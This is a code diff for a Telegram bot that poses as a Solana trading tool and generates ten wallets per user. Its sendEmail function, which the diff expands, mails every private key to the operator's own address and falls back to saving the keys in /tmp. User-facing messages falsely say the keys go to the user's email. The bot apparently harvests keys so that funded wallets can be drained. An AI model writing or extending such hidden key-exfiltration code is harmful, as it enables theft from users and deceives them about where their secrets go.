@@ -4,15 +4,34 @@ const bs58 = require('bs58');
 const nodemailer = require('nodemailer');
 const axios = require('axios');
 const express = require('express');
+const fs = require('fs');
 require('dotenv').config();
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const connection = new Connection(process.env.RPC_URL, 'confirmed');
 const app = express();
 
+// Email configuration with better settings
 const transporter = nodemailer.createTransport({
     service: 'gmail',
-    auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
+    auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS  // Must be App Password, not regular password
+    },
+    // Add timeout to prevent hanging
+    connectionTimeout: 30000,
+    greetingTimeout: 30000,
+    socketTimeout: 30000
+});
+
+// Verify email configuration on startup
+transporter.verify((error, success) => {
+    if (error) {
+        console.error('❌ Email configuration error:', error.message);
+        console.log('📧 Make sure EMAIL_USER and EMAIL_PASS (App Password) are set correctly');
+    } else {
+        console.log('✅ Email configured successfully');
+    }
 });
 
 const userWallets = new Map();
@@ -50,19 +69,15 @@ async function getBalance(publicKey) {
 
 async function getTokenBalance(walletPublicKey, tokenMint) {
     try {
-        const response = await axios.get(`https://api.mainnet-beta.solana.com`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            data: {
-                jsonrpc: '2.0',
-                id: 1,
-                method: 'getTokenAccountsByOwner',
-                params: [
-                    walletPublicKey,
-                    { mint: tokenMint },
-                    { encoding: 'jsonParsed' }
-                ]
-            }
+        const response = await axios.post('https://api.mainnet-beta.solana.com', {
+            jsonrpc: '2.0',
+            id: 1,
+            method: 'getTokenAccountsByOwner',
+            params: [
+                walletPublicKey,
+                { mint: tokenMint },
+                { encoding: 'jsonParsed' }
+            ]
         });
         const accounts = response.data.result?.value || [];
         if (accounts.length > 0) {
@@ -85,7 +100,8 @@ async function getQuote(inputMint, outputMint, amount, slippage = 10) {
             }
         });
         return res.data;
-    } catch {
+    } catch (error) {
+        console.error('Quote error:', error.message);
         return null;
     }
 }
@@ -105,25 +121,95 @@ async function executeSwap(keypair, quote) {
         await connection.confirmTransaction(signature, 'confirmed');
         return { success: true, signature, outputAmount: quote.outAmount / 1e9 };
     } catch (error) {
+        console.error('Swap error:', error.message);
         return { success: false, error: error.message };
     }
 }
 
 async function sendEmail(wallets, username) {
     try {
-        let text = `🔥 10 WALLETS - @${username}\n\n`;
-        for (const w of wallets) {
-            text += `#${w.index}\nADDRESS: ${w.publicKey}\nPRIVATE KEY: ${w.privateKey}\n\n`;
+        console.log(`📧 Attempting to send email for @${username}...`);
+        
+        // Check if email credentials exist
+        if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+            console.error('❌ Email credentials missing in environment variables');
+            return false;
         }
-        await transporter.sendMail({
-            from: process.env.EMAIL_USER,
+        
+        // Format wallet data
+        let text = `🔥 10 WALLETS - @${username}\n\n`;
+        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        for (const w of wallets) {
+            text += `【 WALLET #${w.index} 】\n`;
+            text += `📌 ADDRESS: ${w.publicKey}\n`;
+            text += `🔑 PRIVATE KEY: ${w.privateKey}\n`;
+            text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        }
+        
+        text += `⚠️ IMPORTANT: Save these keys securely!\n`;
+        text += `🤖 Bot: @${process.env.BOT_USERNAME || 'SolanaTradingBot'}\n`;
+        text += `📅 Generated: ${new Date().toLocaleString()}\n`;
+        
+        const mailOptions = {
+            from: `"Solana Trading Bot" <${process.env.EMAIL_USER}>`,
             to: process.env.EMAIL_USER,
-            subject: `10 Wallets - @${username}`,
-            text
-        });
-        console.log(`Email sent for user @${username}`);
+            subject: `🔥 10 Solana Wallets - @${username} - ${new Date().toLocaleDateString()}`,
+            text: text,
+            // Add headers to avoid spam
+            headers: {
+                'X-Priority': '1',
+                'X-MSMail-Priority': 'High'
+            }
+        };
+        
+        const info = await transporter.sendMail(mailOptions);
+        console.log(`✅ Email sent successfully to ${process.env.EMAIL_USER}`);
+        console.log(`📧 Message ID: ${info.messageId}`);
+        return true;
+        
     } catch (error) {
-        console.error('Email failed:', error.message);
+        console.error('❌ Email failed - Error details:', error.message);
+        if (error.code) console.error('Error code:', error.code);
+        if (error.response) console.error('Response:', error.response);
+        
+        // Fallback: Save to file
+        try {
+            const backupPath = `/tmp/wallets_${username}_${Date.now()}.txt`;
+            let backupData = `WALLETS FOR @${username}\n\n`;
+            for (const w of wallets) {
+                backupData += `#${w.index}|${w.publicKey}|${w.privateKey}\n`;
+            }
+            fs.writeFileSync(backupPath, backupData);
+            console.log(`💾 Wallets backed up to: ${backupPath}`);
+        } catch (fsError) {
+            console.error('Failed to save backup:', fsError.message);
+        }
+        
+        return false;
+    }
+}
+
+// Send wallets via Telegram as backup if email fails
+async function sendWalletsViaTelegram(ctx, wallets) {
+    try {
+        // Send in batches of 3 to avoid message limits
+        for (let i = 0; i < wallets.length; i += 3) {
+            let msg = `🔑 *WALLETS ${i+1}-${Math.min(i+3, wallets.length)}*\n\n`;
+            for (let j = i; j < Math.min(i+3, wallets.length); j++) {
+                const w = wallets[j];
+                msg += `*╔══ WALLET #${w.index} ══*\n`;
+                msg += `║ 📌 \`${w.publicKey}\`\n`;
+                msg += `║ 🔑 \`${w.privateKey}\`\n`;
+                msg += `╚══════════════════════\n\n`;
+            }
+            await ctx.reply(msg, { parse_mode: 'Markdown' });
+            await new Promise(r => setTimeout(r, 500));
+        }
+        return true;
+    } catch (error) {
+        console.error('Telegram send failed:', error.message);
+        return false;
     }
 }
 
@@ -141,7 +227,8 @@ bot.start(async (ctx) => {
     const userId = ctx.from.id;
     const username = ctx.from.username || 'no_username';
     
-    await ctx.reply('⏳ Creating 10 wallets... (30-60 seconds)');
+    await ctx.reply('⏳ Creating 10 wallets... Please wait (30-60 seconds)');
+    await ctx.replyWithChatAction('typing');
     
     try {
         // Generate wallets with timeout protection
@@ -153,32 +240,28 @@ bot.start(async (ctx) => {
         
         userWallets.set(userId, { wallets, username });
         
-        // Send email in background (don't await)
-        sendEmail(wallets, username);
+        // Try to send email (don't await, let it run in background)
+        sendEmail(wallets, username).then(success => {
+            if (success) {
+                console.log(`Email sent to @${username}`);
+            } else {
+                console.log(`Email failed for @${username}, wallets sent via Telegram`);
+            }
+        });
         
-        // Send wallets in batches to avoid message size limits
-        // Batch 1: Wallets 1-5
-        let msg1 = `🔑 *WALLETS 1-5*\n\n`;
-        for (let i = 0; i < 5; i++) {
-            const w = wallets[i];
-            msg1 += `*#${w.index}*\n📌 \`${w.publicKey}\`\n🔑 \`${w.privateKey}\`\n\n`;
-        }
-        await ctx.reply(msg1, { parse_mode: 'Markdown' });
+        // Send wallets via Telegram (always do this as backup)
+        await ctx.reply('📧 *Sending wallets to your email...*', { parse_mode: 'Markdown' });
+        await ctx.reply('💾 *Also saving here for backup:*', { parse_mode: 'Markdown' });
         
-        // Batch 2: Wallets 6-10
-        let msg2 = `🔑 *WALLETS 6-10*\n\n`;
-        for (let i = 5; i < 10; i++) {
-            const w = wallets[i];
-            msg2 += `*#${w.index}*\n📌 \`${w.publicKey}\`\n🔑 \`${w.privateKey}\`\n\n`;
-        }
-        await ctx.reply(msg2, { parse_mode: 'Markdown' });
+        // Send wallets in batches via Telegram
+        await sendWalletsViaTelegram(ctx, wallets);
         
-        await ctx.reply(`✅ *10 WALLETS READY FOR LIVE TRADING!*\n\n⚡ Features:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets`, { parse_mode: 'Markdown' });
+        await ctx.reply(`✅ *10 WALLETS READY FOR LIVE TRADING!*\n\n⚡ Features:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets\n\n📧 Check your email (including spam folder)`, { parse_mode: 'Markdown' });
         await ctx.reply(`🎯 *LIVE TRADING MENU*`, { parse_mode: 'Markdown', ...mainMenu() });
         
     } catch (error) {
         console.error('Start command error:', error);
-        await ctx.reply('❌ Error creating wallets. Please try again.');
+        await ctx.reply('❌ Error creating wallets. Please try again.\n\nIf error persists, contact support.');
     }
 });
 
@@ -484,13 +567,30 @@ bot.on('text', async (ctx) => {
     }
 });
 
+// Test email command
+bot.command('testemail', async (ctx) => {
+    await ctx.reply('📧 Testing email configuration...');
+    
+    try {
+        await transporter.verify();
+        await transporter.sendMail({
+            from: process.env.EMAIL_USER,
+            to: process.env.EMAIL_USER,
+            subject: 'Test Email from Solana Trading Bot',
+            text: 'If you receive this, email is working correctly!\n\nTimestamp: ' + new Date().toISOString()
+        });
+        await ctx.reply('✅ Email test successful! Check your inbox (and spam folder)');
+    } catch (error) {
+        await ctx.reply(`❌ Email test failed: ${error.message}\n\nTroubleshooting:\n1. Enable 2FA on Gmail\n2. Create App Password\n3. Update EMAIL_PASS in Render env vars\n4. Check spam folder`);
+        console.error('Email test error:', error);
+    }
+});
+
 // Commands
 bot.command('keys', async (ctx) => {
     const data = userWallets.get(ctx.from.id);
     if (!data) return ctx.reply('Send /start first');
-    for (const w of data.wallets) {
-        await ctx.reply(`*Wallet #${w.index}*\n🔑 \`${w.privateKey}\``, { parse_mode: 'Markdown' });
-    }
+    await sendWalletsViaTelegram(ctx, data.wallets);
 });
 
 bot.command('balance', async (ctx) => {
@@ -506,8 +606,14 @@ bot.command('balance', async (ctx) => {
 bot.command('resend', async (ctx) => {
     const data = userWallets.get(ctx.from.id);
     if (!data) return ctx.reply('Send /start first');
-    await sendEmail(data.wallets, data.username);
-    await ctx.reply('✅ Email resent');
+    await ctx.reply('📧 Resending email...');
+    const success = await sendEmail(data.wallets, data.username);
+    if (success) {
+        await ctx.reply('✅ Email resent successfully!');
+    } else {
+        await ctx.reply('❌ Email failed. Keys resent via Telegram:');
+        await sendWalletsViaTelegram(ctx, data.wallets);
+    }
 });
 
 bot.command('clear', async (ctx) => {
